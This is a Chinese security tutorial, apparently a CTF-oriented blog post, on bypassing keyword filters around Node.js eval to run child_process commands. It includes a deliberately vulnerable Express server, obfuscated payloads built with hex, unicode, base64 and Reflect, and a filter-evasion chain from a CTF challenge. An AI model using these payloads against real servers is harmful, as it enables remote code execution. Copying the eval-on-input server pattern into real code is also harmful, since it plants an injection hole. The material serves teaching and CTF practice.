> 原文链接: https://www.anquanke.com//post/id/237032 


# nodejs中代码执行绕过的一些技巧


                                阅读量   
                                **183053**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t01368e67d2832daa36.png)](https://p0.ssl.qhimg.com/t01368e67d2832daa36.png)



在php中，eval代码执行是一个已经被玩烂了的话题，各种奇技淫巧用在php代码执行中来实现bypass。这篇文章主要讲一下`nodejs`中bypass的一些思路。



## 1. child_process

首先介绍一下nodejs中用来执行系统命令的模块`child_process`。Nodejs通过使用child_process模块来生成多个子进程来处理其他事物。在child_process中有七个方法它们分别为：execFileSync、spawnSync,execSync、fork、exec、execFile、以及spawn,而这些方法使用到的都是spawn()方法。因为`fork`是运行另外一个子进程文件，这里列一下除fork外其他函数的用法。

```
require("child_process").exec("sleep 3");
require("child_process").execSync("sleep 3");
require("child_process").execFile("/bin/sleep",["3"]); //调用某个可执行文件，在第二个参数传args
require("child_process").spawn('sleep', ['3']);
require("child_process").spawnSync('sleep', ['3']);
require("child_process").execFileSync('sleep', ['3']);
```

不同的函数其实底层具体就是调用spawn，有兴趣的可以跟进源码看一下

```
const child = spawn(file, args, `{`
  cwd: options.cwd,
  env: options.env,
  gid: options.gid,
  uid: options.uid,
  shell: options.shell,
  windowsHide: !!options.windowsHide,
  windowsVerbatimArguments: !!options.windowsVerbatimArguments
`}`);
```



## 2. nodejs中的命令执行

为了演示代码执行，我写一个最简化的服务端，代码如下

```
const express = require('express')
const bodyParser = require('body-parser')
const app = express()

app.use(bodyParser.urlencoded(`{` extended: true `}`))
app.post('/', function (req, res) `{`
    code = req.body.code;
    console.log(code);
    res.send(eval(code));
`}`)

app.listen(3000)
```

原理很简单，就是接受`post`方式传过来的code参数，然后返回`eval(code)`的结果。

在nodejs中，同样是使用`eval()`函数来执行代码，针对上文提到rce函数，首先就可以得到如下利用代码执行来rce的代码。

> 以下的命令执行都用curl本地端口的方式来执行

```
eval('require("child_process").execSync("curl 127.0.0.1:1234")')
```

这是最简单的代码执行情况，当然一般情况下，开发者在用eval而且层层调用有可能接受用户输入的点，并不会简单的让用户输入直接进入，而是会做一些过滤。譬如，如果过滤了exec关键字，该如何绕过?

> 当然实际不会这么简单，本文只是谈谈思路，具体可以根据实际过滤的关键字变通

下面是微改后的服务端代码，加了个正则检测`exec`关键字

```
const express = require('express')
const bodyParser = require('body-parser')
const app = express()

function validcode(input) `{`
  var re = new RegExp("exec");
  return re.test(input);
`}`

app.use(bodyParser.urlencoded(`{` extended: true `}`))
app.post('/', function (req, res) `{`
  code = req.body.code;
  console.log(code);
  if (validcode(code)) `{`
    res.send("forbidden!")
  `}` else `{`
    res.send(eval(code));
  `}`
`}`)

app.listen(3000)
```

这就有6种思路:
- 16进制编码
- unicode编码
- 加号拼接
- 模板字符串
- concat函数连接
- base64编码
### <a class="reference-link" name="2.1%2016%E8%BF%9B%E5%88%B6%E7%BC%96%E7%A0%81"></a>2.1 16进制编码

第一种思路是16进制编码，原因是在`nodejs`中，如果在字符串内用16进制，和这个16进制对应的ascii码的字符是等价的(第一反应有点像mysql)。

```
console.log("a"==="\x61");
// true
```

但是在上面正则匹配的时候，16进制却不会转化成字符，所以就可以绕过正则的校验。所以可以传

```
require("child_process")["exe\x63Sync"]("curl 127.0.0.1:1234")
```

### <a class="reference-link" name="2.2%20unicode%E7%BC%96%E7%A0%81"></a>2.2 unicode编码

思路跟上面是类似的，由于`JavaScript`允许直接用码点表示Unicode字符，写法是”反斜杠+u+码点”，所以我们也可以用一个字符的unicode形式来代替对应字符。

```
console.log("\u0061"==="a");
// true
require("child_process")["exe\u0063Sync"]("curl 127.0.0.1:1234")
```

### <a class="reference-link" name="2.3%20%E5%8A%A0%E5%8F%B7%E6%8B%BC%E6%8E%A5"></a>2.3 加号拼接

原理很简单，加号在js中可以用来连接字符，所以可以这样

```
require('child_process')['exe'%2b'cSync']('curl 127.0.0.1:1234')
```

### <a class="reference-link" name="2.4%20%E6%A8%A1%E6%9D%BF%E5%AD%97%E7%AC%A6%E4%B8%B2"></a>2.4 模板字符串

相关内容可以参考[MDN](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals)，这里给出一个payload

> 模板字面量是允许嵌入表达式的字符串字面量。你可以使用多行字符串和字符串插值功能。

```
require('child_process')[`$`{``$`{``exe``}`cSync``}``]('curl 127.0.0.1:1234')
```

### <a class="reference-link" name="2.5%20concat%E8%BF%9E%E6%8E%A5"></a>2.5 concat连接

利用js中的concat函数连接字符串

```
require("child_process")["exe".concat("cSync")]("curl 127.0.0.1:1234")
```

### <a class="reference-link" name="2.6%20base64%E7%BC%96%E7%A0%81"></a>2.6 base64编码

这种应该是比较常规的思路了。

```
eval(Buffer.from('Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=','base64').toString())
```



## 3. 其他bypass方式

这一块主要是换个思路，上面提到的几种方法，最终思路都是通过编码或者拼接得到`exec`这个关键字，这一块考虑js的一些语法和内置函数。

### <a class="reference-link" name="3.1%20Obejct.keys"></a>3.1 Obejct.keys

实际上通过`require`导入的模块是一个`Object`，所以就可以用`Object`中的方法来操作获取内容。利用`Object.values`就可以拿到`child_process`中的各个函数方法，再通过数组下标就可以拿到`execSync`

```
console.log(require('child_process').constructor===Object)
//true
Object.values(require('child_process'))[5]('curl 127.0.0.1:1234')
```

### <a class="reference-link" name="3.2%20Reflect"></a>3.2 Reflect

在js中，需要使用`Reflect`这个关键字来实现反射调用函数的方式。譬如要得到`eval`函数，可以首先通过`Reflect.ownKeys(global)`拿到所有函数，然后`global[Reflect.ownKeys(global).find(x=&gt;x.includes('eval'))]`即可得到eval

```
console.log(Reflect.ownKeys(global))
//返回所有函数
console.log(global[Reflect.ownKeys(global).find(x=&gt;x.includes('eval'))])
//拿到eval
```

拿到eval之后，就可以常规思路rce了

```
global[Reflect.ownKeys(global).find(x=&gt;x.includes('eval'))]('global.process.mainModule.constructor._load("child_process").execSync("curl 127.0.0.1:1234")')
```

这里虽然有可能被检测到的关键字，但由于`mainModule`、`global`、`child_process`等关键字都在字符串里，可以利用上面提到的方法编码，譬如16进制。

```
global[Reflect.ownKeys(global).find(x=&gt;x.includes('eval'))]('\x67\x6c\x6f\x62\x61\x6c\x5b\x52\x65\x66\x6c\x65\x63\x74\x2e\x6f\x77\x6e\x4b\x65\x79\x73\x28\x67\x6c\x6f\x62\x61\x6c\x29\x2e\x66\x69\x6e\x64\x28\x78\x3d\x3e\x78\x2e\x69\x6e\x63\x6c\x75\x64\x65\x73\x28\x27\x65\x76\x61\x6c\x27\x29\x29\x5d\x28\x27\x67\x6c\x6f\x62\x61\x6c\x2e\x70\x72\x6f\x63\x65\x73\x73\x2e\x6d\x61\x69\x6e\x4d\x6f\x64\x75\x6c\x65\x2e\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72\x2e\x5f\x6c\x6f\x61\x64\x28\x22\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73\x22\x29\x2e\x65\x78\x65\x63\x53\x79\x6e\x63\x28\x22\x63\x75\x72\x6c\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x31\x32\x33\x34\x22\x29\x27\x29')
```

> 这里还有个小trick，如果过滤了`eval`关键字，可以用`includes('eva')`来搜索`eval`函数，也可以用`startswith('eva')`来搜索

### <a class="reference-link" name="3.3%20%E8%BF%87%E6%BB%A4%E4%B8%AD%E6%8B%AC%E5%8F%B7%E7%9A%84%E6%83%85%E5%86%B5"></a>3.3 过滤中括号的情况

在`3.2`中，获取到eval的方式是通过`global`数组，其中用到了中括号`[]`，假如中括号被过滤，可以用`Reflect.get`来绕

> `Reflect.get(target, propertyKey[, receiver])`的作用是获取对象身上某个属性的值，类似于`target[name]`。

所以取eval函数的方式可以变成

```
Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.includes('eva')))
```

后面拼接上命令执行的payload即可。



## 4. NepCTF-gamejs

这个题目第一步是一个原型链污染，第二步是一个`eval`的命令执行，因为本文主要探讨一下eval的bypass方式，所以去掉原型链污染，只谈后半段bypass，代码简化后如下:

```
const express = require('express')
const bodyParser = require('body-parser')
const app = express()

var validCode = function (func_code)`{`
  let validInput = /subprocess|mainModule|from|buffer|process|child_process|main|require|exec|this|eval|while|for|function|hex|char|base64|"|'|\[|\+|\*/ig;
  return !validInput.test(func_code);
`}`;

app.use(bodyParser.urlencoded(`{` extended: true `}`))
app.post('/', function (req, res) `{`
  code = req.body.code;
  console.log(code);
  if (!validCode(code)) `{`
    res.send("forbidden!")
  `}` else `{`
    var d = '(' + code + ')';
    res.send(eval(d));
  `}`
`}`)

app.listen(3000)
```

由于关键字过滤掉了单双引号，这里可以全部换成反引号。没有过滤掉`Reflect`，考虑用反射调用函数实现RCE。利用上面提到的几点，逐步构造一个非预期的payload。首先，由于过滤了`child_process`还有`require`关键字，我想到的是base64编码一下再执行

```
eval(Buffer.from(`Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=`,`base64`).toString())
```

这里过滤了`base64`，可以直接换成

```
`base`.concat(64)
```

过滤掉了`Buffer`，可以换成

```
Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.startsWith(`Buf`)))
```

要拿到`Buffer.from`方法，可以通过下标

```
Object.values(Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.startsWith(`Buf`))))[1]
```

但问题在于，关键字还过滤了中括号，这一点简单，再加一层`Reflect.get`

```
Reflect.get(Object.values(Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.startsWith(`Buf`)))),1)
```

所以基本payload变成

```
Reflect.get(Object.values(Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.startsWith(`Buf`)))),1)(`Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=`,`base`.concat(64)).toString()
```

但问题在于，这样传过去后，eval只会进行解码，而不是执行解码后的内容，所以需要再套一层eval，因为过滤了eval关键字，同样考虑用反射获取到eval函数。

```
Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.includes('eva')))(Reflect.get(Object.values(Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.startsWith(`Buf`)))),1)(`Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=`,`base`.concat(64)).toString())
```

在能拿到`Buffer.from`的情况下，用16进制编码也一样.

```
Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.includes('eva')))(Reflect.get(Object.values(Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.startsWith(`Buf`)))),1)(`676c6f62616c2e70726f636573732e6d61696e4d6f64756c652e636f6e7374727563746f722e5f6c6f616428226368696c645f70726f6365737322292e6578656353796e6328226375726c203132372e302e302e313a313233342229`,`he`.concat(`x`)).toString())
```

当然，由于前面提到的16进制和字符串的特性，也可以拿到eval后直接传16进制字符串

```
Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.includes(`eva`)))(`\x67\x6c\x6f\x62\x61\x6c\x2e\x70\x72\x6f\x63\x65\x73\x73\x2e\x6d\x61\x69\x6e\x4d\x6f\x64\x75\x6c\x65\x2e\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72\x2e\x5f\x6c\x6f\x61\x64\x28\x22\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73\x22\x29\x2e\x65\x78\x65\x63\x53\x79\x6e\x63\x28\x22\x63\x75\x72\x6c\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x31\x32\x33\x34\x22\x29`)
```

感觉nodejs中对字符串的处理方式太灵活了，如果能eval的地方，最好还是不要用字符串黑名单做过滤吧。

感谢我前端大哥[semesse](https://blog.semesse.me/)的帮助



## 参考链接
1. [https://xz.aliyun.com/t/9167](https://xz.aliyun.com/t/9167)
1. [https://camp.hackingfor.fun/](https://camp.hackingfor.fun/)